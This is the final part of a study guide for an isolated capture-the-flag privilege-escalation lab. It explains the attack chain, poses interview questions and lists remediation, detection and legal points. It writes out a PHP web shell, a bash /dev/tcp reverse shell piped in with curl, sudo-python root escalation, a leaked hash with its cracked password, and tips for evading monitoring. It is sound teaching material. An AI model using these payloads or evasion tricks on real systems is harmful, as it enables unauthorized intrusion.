- **Why anonymous FTP + directory overlap for initial access (vs, say, a SQLi)?** It's a pure **misconfiguration** composite — no exploit code, no CVE — which drives home that most real breaches are configuration, not zero-days. Alternatives (SQLi, an outdated-CMS RCE, weak SSH creds) would teach different lessons; this one teaches "audit how services share directories."
- **Why a reverse shell rather than just using the web shell?** To teach the difference between one-shot RCE and an interactive session, and why *outbound* is the reliable direction. Alternative: a PTY upgrade of the web shell (`python -c 'pty.spawn…'`) — also valid, shown as a fallback in §12.
- **Why leak an MD5 hash instead of a plaintext password?** So the student must (a) recognize a hash by length/charset, (b) know MD5 is crackable, (c) use a cracking workflow. A plaintext leak would skip the most instructive part. Alternative teaching hashes: `sha512crypt` (needs `hashcat` + `rockyou`, slower — a harder lesson), bcrypt (often infeasible — teaches "sometimes you can't").
- **Why a `sudo NOPASSWD` interpreter for the final step (vs a SUID binary or kernel exploit)?** It's the single most common real-world Linux privesc and it's deterministic/safe for a lab. Alternatives: a SUID custom binary with a `system()` call, a writable `PATH` + cron, `LD_PRELOAD` via `sudo env_keep`, a kernel exploit (risky in a lab — can panic the VM).
- **Why host-only networking?** NAT hides the target's inbound ports and breaks the listener/reverse-shell path; bridged would put attack traffic on the real LAN. Host-only is the only mode that is both functional and contained.
- **Why include remediation + a report email + an ethics section?** Because the deliverable of professional pentesting is the *report*, not the flag. A finding you can't explain or fix — or weren't authorized to test — has negative value.
- **Why identify the target by MAC OUI *and* by port fingerprint?** Redundancy: on a lab net several VMs may share the `08:00:27` OUI, so "the only one running FTP+HTTP+SSH" is the disambiguator.

---

## 17. Interview / Oral Defense Questions

### Beginner

**B1. What is privilege escalation, and which kind does this challenge demonstrate?** — Gaining rights beyond those granted. This is **vertical** (`www-data` → `root`), with a credential-based pivot to the `shrek` user in between. *(README §2.1; steps 6–10.)*

**B2. Why is the lab on a host-only network and not NAT?** — NAT prevents the attacker from reaching the target's inbound ports and breaks the `nc` listener / reverse shell. Host-only gives bidirectional reachability while keeping traffic off the real LAN/internet. *(README §1.)*

**B3. What does `nmap -sn` do?** — Host discovery only ("ping scan"), no port scan — on-link it uses ARP, which host firewalls can't drop. *(Step 1; §6.1.)*

**B4. What do `-sV` and `-sC` add to an nmap scan?** — `-sV` fingerprints service product/version; `-sC` runs the default NSE script set, including `ftp-anon`, which reports anonymous FTP. *(Step 2; §6.2.)*

**B5. What is a web shell?** — A script on the web server that runs attacker-supplied OS commands via HTTP. Here `<?php system($_GET["cmd"]); ?>`. *(Step 5; §6.5.)*

**B6. What does `curl "http://…/files/shell.php?cmd=id"` prove?** — Unauthenticated remote code execution: the response `uid=33(www-data)` is the output of `id` run on the server. *(Step 5.)*

**B7. What is a reverse shell and why "reverse"?** — The victim connects **out** to the attacker's listener (vs a bind shell where the victim listens). Outbound is usually allowed by firewalls/NAT; inbound usually isn't. *(Step 6; §6.6.)*

**B8. What is `/dev/tcp/HOST/PORT`?** — Not a real file — a bash built-in pseudo-path; opening it makes bash create a TCP socket to `HOST:PORT`. *(§6.6.)*

**B9. Why is MD5 a bad choice for password storage?** — It's extremely fast (cheap brute force) and, unsalted, lets precomputed lookup tables / rainbow tables reverse common passwords instantly. *(Step 8; §6.8, §9.)*

**B10. What does `sudo -l` show, and what did it reveal here?** — The current user's sudo privileges. Here: `(root) NOPASSWD: /usr/bin/python3.5` — `shrek` can run that binary as root with no password. *(Step 9; §6.9.)*

### Intermediate

**I1. Exactly which three misconfigurations combine to give unauthenticated RCE, and would removing one break it?** — (1) anonymous FTP with write, (2) the FTP root == the web server's `/files/` directory, (3) PHP execution enabled in that directory. Removing any one breaks the foothold: no write → no upload; no overlap → the file isn't web-reachable; no PHP exec → the file is served as text. *(V1–V3.)*

**I2. Walk through `bash -i >& /dev/tcp/192.168.56.102/4444 0>&1` token by token.** — `bash -i`: interactive shell; `/dev/tcp/…/4444`: bash opens a TCP socket to the attacker; `>&`: send stdout+stderr into that socket; `0>&1`: send stdin from the socket too — so all three fds are the connection. *(§6.6; §7.2.)*

**I3. Why serve `rev.sh` over `python3 -m http.server` instead of a second FTP `put`?** — Speed and no auth/handshake; and it decouples payload delivery from the initial upload vector. The web shell just `curl`s it and pipes to `bash`. *(Step 6.)*

**I4. How do you identify the target IP on a lab network with no DNS?** — MAC OUI (`08:00:27` = VirtualBox guest; gateway shows `0A:00:27`; your own box shows no MAC) **and** service fingerprint (only the target runs FTP+HTTP+SSH). Confirm with `nc -nv <ip> 21` → `220 ProFTPD`. *(README §1.)*

**I5. What is `curl -G --data-urlencode "cmd=…"` doing and why not just `?cmd=…`?** — `-G` forces the `--data-*` content into the query string; `--data-urlencode` percent-encodes it so spaces, `/`, and `|` survive transport into `$_GET['cmd']`. *(Step 6.)*

**I6. The reverse shell doesn't call back. Give three causes and a fix for each.** — Egress firewall blocks port 4444 (use 443/80/53); target `bash` lacks `/dev/tcp` (use `mkfifo`+`nc` / `python` PTY / `socat`); no `curl`/`wget` on target (base64 the payload inline in `cmd=`, or pull via `/dev/tcp`). *(§12.)*

**I7. Why does the MD5 crack step generate no traffic to the target, and why does that matter?** — It's an **offline** lookup on the attacker's machine against a third-party dataset (CrackStation). It matters for stealth (nothing to detect) and legally/ethically (you're not touching the target's infra). *(§6.8; README §7.)*

**I8. Explain what `sudo` does between "user types the command" and "python runs".** — Parses `/etc/sudoers` + `sudoers.d`; finds a matching `user host=(runas) cmd` rule; because `NOPASSWD`, skips the password prompt; sets real/effective/saved UID+GID to the runas target (root = 0); `execve`s the exact command. *(§6.10; §11.4.)*

**I9. Why is `sudo NOPASSWD: /usr/bin/python3.5` equivalent to giving `shrek` a root password?** — Any interpreter (Python/Perl/Ruby), editor, or pager runnable as root can spawn a root shell (`os.system("/bin/bash")`). `NOPASSWD` removes even the account-password speed bump. Catalogued in GTFOBins. *(§6.10; §9.)*

**I10. Which log entries would a defender see for this attack?** — FTP log: anonymous `STOR shell.php`. Web/file-integrity: a new `.php` in a served dir. IDS: `$_GET["cmd"]` / web-shell signatures. Netflow: an unusual **outbound** TCP from the web host to an internal IP:4444. `auth.log`: `sudo` running `python3.5` as root. *(README §7.5.)*

### Advanced

**A1. If anonymous FTP write were disabled, what other initial-access avenues does the recon output suggest?** — OpenSSH 7.2p2 (check for user enumeration CVE-2016-6210 / weak creds / password spray), Apache 2.4.18 on Ubuntu 16.04 (dated — look for exposed apps, dir listing `autoindex`, LFI/upload forms), and ProFTPD version-specific CVEs (e.g. `mod_copy` `SITE CPFR/CPTO` on vulnerable builds, which can copy a file into the webroot *without* anonymous write). *(Recon output; §12.)*

**A2. Contrast a bind shell and a reverse shell at the socket-API level, and why the reverse shell is chosen here.** — Bind: victim `socket()→bind()→listen()→accept()`; attacker `connect()`s in — blocked by inbound firewall/NAT. Reverse: victim `socket()→connect()` outbound; attacker `listen()→accept()` — matches typical "allow established outbound" firewall policy. The target here is behind host-only with unknown inbound filtering, so outbound is the safe bet. *(§6.6; §11.3.)*

**A3. The leaked hash is a bare 32-hex MD5, not a `$1$salt$…` crypt string. What does that tell you and how does it change the cracking approach?** — Bare MD5 ⇒ no salt, so identical passwords collide and **online lookup tables** work directly (CrackStation). A `$1$` crypt string is salted MD5 — lookup tables fail; you'd need `john --format=md5crypt` / `hashcat -m 500` with a wordlist. Salt presence is the single biggest factor in feasibility. *(§6.8; §9; §11.4.)*

**A4. Give a hardened `sudoers` rule that still lets `shrek` run a specific root task without granting a shell.** — Grant the *script's* absolute path only, script root-owned and `shrek`-unwritable, no wildcards, no interpreter: `shrek ALL=(root) /opt/ops/rotate-logs.sh ""` (empty arg spec ⇒ no arguments allowed); drop `NOPASSWD` unless there's a hard requirement; add `Defaults!/opt/ops/rotate-logs.sh !requiretty` etc. as needed. Still audit — a script that itself calls `tar --checkpoint-action=exec` or sources user files reopens the hole. *(§13 V6b.)*

**A5. How would you make the whole chain far quieter (assume a monitored target)?** — Upload the web shell over an already-permitted channel; avoid `system()`-family (use PHP `proc_open` with obfuscated params, or an in-memory shell); egress on 443 with TLS (`openssl s_client` reverse shell) to blend with normal traffic; crack offline (already done); use the *exact* sudo path once; clear only your own artifacts, not system logs (log-wiping is itself an alert). *(README §7.5 inverse; §13.)*

**A6. Why is the "rabbit hole" step (identifying `life.c`/`template.html` as decoys) a real skill, not filler?** — Time is the pentester's scarcest resource; challenge authors and real environments both contain plausible-looking dead ends. The skill is forming a cheap hypothesis, testing it quickly, and abandoning it without sunk-cost bias — mirrored in the report's "document everything, stop when in doubt" discipline. *(Step 3; README §7.4.)*

**A7. The engagement crosses several trust boundaries. Enumerate them and the mechanism that should have stopped each.** — (network user → FTP filesystem write): `<Limit WRITE> DenyAll`. (FTP-written file → HTTP-reachable): separate FTP dir from docroot. (HTTP-reachable file → code execution): disable PHP engine / extension allow-list. (`www-data` → read another account's secret): least-privilege file perms (`600`). (leaked hash → usable password): strong salted hash + no credential reuse. (`shrek` → root): scoped `sudoers` rule, no interpreter, keep the password prompt. *(§13.)*

**A8. What is the legal exposure of running this exact sequence against a machine you don't own, even with "no damage"?** — Unauthorized access itself is the offense: CFAA (US), Morocco's Law 07-03 on cybercrime, and data-protection statutes (Law 09-08 / GDPR) apply regardless of intent or damage. Port scanning alone can breach acceptable-use policy; uploading a shell and reading files is clear unauthorized access and potentially unauthorized modification. Authorization must be written, scoped, time-boxed, and signed by someone with authority over the target. *(README §7.1–7.2.)*

**A9. Propose a detection rule for the reverse-shell step specifically.** — Alert on outbound TCP **from a server that should only receive** (web/DB tier) to an RFC1918 or external address on a non-standard port, especially immediately following an HTTP request that contains shell metacharacters; corroborate with a process-tree alert: `apache2/php-fpm` spawning `sh -c 'curl … | bash'` or a child `bash` with a socket on fd 0/1/2. *(README §7.5.)*

**A10. If `/root/root.txt` were the only goal and you already had the `www-data` shell, is `shrek` strictly necessary?** — Only if a *direct* `www-data`→root path existed (SUID binary, writable cron/service, kernel exploit, docker group, capabilities). The challenge is authored so the intended path goes through `shrek`'s `sudo` grant; `www-data` has no such primitive here, so the credential pivot is required. A good methodology still checks the direct paths first (LinPEAS) before committing to the pivot. *(§12; §16.)*

---

## 18. "Explain This Engagement to an Interviewer"

**The whole chain.**
> "Starting with only network access to a host-only lab subnet, I ran an nmap ping sweep to find the target, then a full-port version scan that flagged anonymous FTP allowed on ProFTPD, alongside SSH and Apache. I logged into FTP anonymously and confirmed I could upload. Directory brute-forcing the web server turned up `/files/`, whose contents matched the FTP root — so the FTP upload directory was being served by Apache. I uploaded a one-line PHP web shell and confirmed unauthenticated RCE as `www-data` with `?cmd=id`. To get an interactive session I hosted a bash reverse-shell one-liner on a quick Python HTTP server and had the web shell curl-pipe it to bash, which connected back to my netcat listener. As `www-data` I found a breadcrumb pointing to a world-readable script that leaked `shrek`'s MD5 password hash; I cracked it offline with CrackStation to `youaresmart`. I SSH'd in as `shrek`, ran `sudo -l`, and saw `NOPASSWD` on `/usr/bin/python3.5` — a full interpreter as root — so `sudo python3.5 -c 'import os; os.system("/bin/bash")'` gave me a root shell and the flag. The root cause of initial access was three stacked misconfigurations; the root cause of escalation was a `sudoers` rule granting an interpreter."

**The web shell.**
> "It's `<?php system($_GET["cmd"]); ?>`. Apache hands `.php` files to `mod_php`; `system()` runs its argument through `/bin/sh -c` and streams the output into the HTTP response. Because `$_GET["cmd"]` is straight from the URL with no validation, any request like `?cmd=whoami` runs that command as the Apache user. It only worked because the file was both writable via anonymous FTP and executable as PHP in that directory."

**The reverse shell.**
> "`bash -i >& /dev/tcp/ATTACKER/4444 0>&1`. `/dev/tcp/host/port` is a bash feature — opening it makes bash create a TCP connection. `>&` sends stdout and stderr into that connection and `0>&1` pulls stdin from it, so an interactive bash's three streams are all the socket. The target dials out to my `nc -lvnp 4444`, which sidesteps inbound firewall rules."

**The privilege escalation.**
> "`sudo -l` showed `shrek` could run `/usr/bin/python3.5` as root without a password. Any interpreter runnable as root is a root shell — `sudo python3.5 -c 'import os; os.system("/bin/bash")'`: sudo elevates to UID 0 and execs python, python shells out to bash, bash inherits UID 0. This is a GTFOBins-class escalation; the fix is to remove the rule or scope sudo to a specific non-interpreter binary."

**Why it's defensible work.**
> "Everything was against a VM explicitly provided for this exercise on an isolated network — fully authorized. The hash crack was done offline so nothing touched the target. The deliverable isn't the flag, it's the remediation report: disable anonymous FTP write, separate the FTP and web directories, disable PHP in upload dirs, use bcrypt/argon2, and remove the sudo interpreter grant."

---

## 19. Common Mistakes

1. **Skipping `-p-` and missing a service.** Only scanning the top-1000 ports can hide the very service that matters. Always full-port on a box you're allowed to hammer.
2. **Assuming anonymous FTP = read-only.** The interesting case is anonymous **write** — always test `put`.
3. **Not verifying the FTP↔web overlap.** Finding `/files/` isn't enough; confirm your uploaded file actually appears and *executes* there before building on it.
4. **Uploading a web shell and expecting it to run when PHP is disabled in that dir.** If `?cmd=id` returns the PHP *source*, the engine is off — pivot to `.phtml`/`.pht` or another RCE.
5. **Using the web shell as if it were a real shell.** It's stateless — `cd` doesn't persist, `sudo` can't prompt. Get a reverse shell (and a PTY) first.
6. **Reverse-shell port 4444 blocked and giving up.** Try 443/80/53; try `socat`/`mkfifo`/`python` PTY variants.
7. **Not URL-encoding the `cmd` payload.** Spaces and `|` break the query string; use `curl -G --data-urlencode`.
8. **Mis-identifying the hash.** 32 hex chars ≠ always plain MD5 — could be NTLM, or salted `$1$`. Run `hashid`; the cracking method differs a lot.
9. **Trying to "crack" a strong hash forever.** If it's bcrypt/argon2 or a long random password, move on — look for another privesc path.
10. **Running `sudo python3` when the rule says `/usr/bin/python3.5`.** `sudo` matches the *exact* path; call it literally.
11. **Log-wiping to "cover tracks".** In a real engagement that's out of scope, destructive, and itself a huge alert. Document, don't destroy.
12. **Treating the flag as the deliverable.** The report (findings, impact, fixes, evidence) is the product.
13. **Forgetting this is illegal off the lab.** The exact same commands against an unauthorized host are a crime regardless of outcome.
14. **Ignoring the decoys' lesson.** `life.c`/`template.html` are there to teach you to bail on dead ends fast.

---

## 20. Final Project Summary

### What I MUST understand
1. **The full chain and that it's a *chain of misconfigurations*, not exploits** — recon → anon-FTP write → FTP/web dir overlap → PHP web shell (unauth RCE) → reverse shell → local enum → world-readable MD5 leak → offline crack → SSH → `sudo` interpreter → root.
2. **Why each initial-access vuln (V1–V3) is individually chain-breaking.**
3. **Web shell mechanics** — `<?php system($_GET['cmd']); ?>`, why it needs both web-reachability and PHP execution.
4. **Reverse shell mechanics** — `bash -i >& /dev/tcp/HOST/PORT 0>&1`, fd redirection, why outbound.
5. **Password hashing** — MD5's weakness (fast + unsalted → lookup tables), and the modern alternatives (bcrypt/argon2/scrypt/sha512crypt + salt).
6. **`sudo` / `sudoers` / GTFOBins** — any root-runnable interpreter/editor/pager = a root shell; `NOPASSWD` removes the last speed bump.
7. **Vertical vs horizontal escalation**, and that this chain is vertical with a credential pivot.
8. **The isolation + authorization + reporting discipline** — host-only net, written scope, offline cracking, remediation report, legal frameworks.
9. **The remediation for all six findings.**

### Architecture in 30 seconds
> "Isolated VirtualBox host-only lab, one Linux target running FTP/SSH/HTTP. nmap finds anonymous-FTP-with-write. The FTP upload directory is also the web server's `/files/`, and PHP runs there — so an uploaded one-line PHP web shell gives unauthenticated RCE as `www-data`. A bash `/dev/tcp` reverse shell makes it interactive. A world-readable script leaks user `shrek`'s MD5 hash, cracked offline to `youaresmart`. SSH in as `shrek`; `sudo -l` shows `NOPASSWD` on `/usr/bin/python3.5`; `sudo python3.5 -c 'import os; os.system(\"/bin/bash\")'` → root → read `/root/root.txt`."

### Architecture in 2 minutes
> "The engagement starts with only L3 reachability to `192.168.56.0/24`. `nmap -sn` identifies the target (`.101`) by VirtualBox MAC OUI and by being the only host running FTP+HTTP+SSH; `nmap -sV -sC -p-` fingerprints ProFTPD, OpenSSH 7.2p2, Apache 2.4.18 and — critically — the `ftp-anon` script reports anonymous login allowed. The `ftp` client logs in as `anonymous` and can `put` files because ProFTPD's `<Anonymous>` block doesn't deny WRITE (V1). `gobuster` discovers `/files/` on the web server, whose contents equal the FTP root — the anonymous FTP directory is inside Apache's served tree (V2), and PHP execution is enabled there (V3). Uploading `<?php system($_GET["cmd"]); ?>` and requesting `?cmd=id` returns `uid=33(www-data)` — unauthenticated RCE. To get an interactive foothold, a bash reverse-shell one-liner (`bash -i >& /dev/tcp/ATTACKER/4444 0>&1`, which rewires the shell's stdin/stdout/stderr onto an outbound TCP socket) is hosted on `python3 -m http.server` and executed via the web shell piping `curl … | bash`; it connects back to `nc -lvnp 4444`. Local enumeration finds `/home/important.txt` pointing at the world-readable `/.runme.sh`, which leaks `shrek:061fe5e7b95d5f98208d7bc89ed2d569` — a bare, unsalted MD5 hash (V4 = secret in a script, V5 = weak hash). CrackStation reverses it offline to `youaresmart` with zero target traffic. `ssh shrek@…` succeeds; `sudo -l` reveals `(root) NOPASSWD: /usr/bin/python3.5` (V6) — a full interpreter runnable as root, which per GTFOBins is a root shell: `sudo /usr/bin/python3.5 -c 'import os; os.system("/bin/bash")'` yields `uid=0` and `/root/root.txt`. Remediation: deny anonymous FTP write, separate FTP and web directories, disable PHP in upload dirs, switch to bcrypt/argon2 with salts, stop storing credentials in scripts, and delete the sudo interpreter grant."

### Deep technical explanation
See §6 (every command dissected), §9 (every concept in TERM form), §11 (FTP/HTTP/reverse-shell/auth traced through the OS layers), §13 (the six vulnerabilities with mechanism + impact + fix), §14 (the two data journeys: upload→RCE and leak→root).

### Most important "functions" (here: commands/payloads)
| Artifact | Role |
|---|---|
| `nmap -sn` / `nmap -sV -sC -p-` | Discover the target; find "anonymous FTP allowed" — the linchpin |
| `ftp … put shell.php` | Write an attacker file into a web-served directory |
| `gobuster dir` | Prove the FTP root == the web `/files/` directory |
| `shell.php` = `<?php system($_GET["cmd"]); ?>` | Unauthenticated RCE as `www-data` |
| `rev.sh` = `bash -i >& /dev/tcp/…/4444 0>&1` + `nc -lvnp 4444` | Interactive foothold via an outbound socket |
| `cat /.runme.sh` | Leak `shrek`'s MD5 hash |
| CrackStation / `john --format=raw-md5` | Offline recovery of `youaresmart` |
| `ssh shrek@…` + `sudo -l` | Authenticated pivot + discovery of the escalation primitive |
| `sudo /usr/bin/python3.5 -c 'import os; os.system("/bin/bash")'` | `shrek` → `root` |

### Most important concepts
Vertical vs horizontal privilege escalation · anonymous FTP (and anonymous **write**) · FTP/web document-root overlap · web shell · Remote Code Execution · reverse shell & bash `/dev/tcp` · TCP/ports/sockets/listeners · HTTP query string & URL-encoding · MAC OUI target identification · `/etc/passwd` vs `/etc/shadow` vs PAM · password hashing, MD5 weakness, salt, rainbow/lookup tables · `sudo`/`sudoers`/`NOPASSWD` · GTFOBins (interpreter-as-root = root shell) · rabbit holes/decoys · isolated lab / host-only networking / snapshots · authorization, scope, rules of engagement, responsible disclosure, and the relevant legal frameworks (CFAA, Morocco Law 07-03 & 09-08, GDPR).
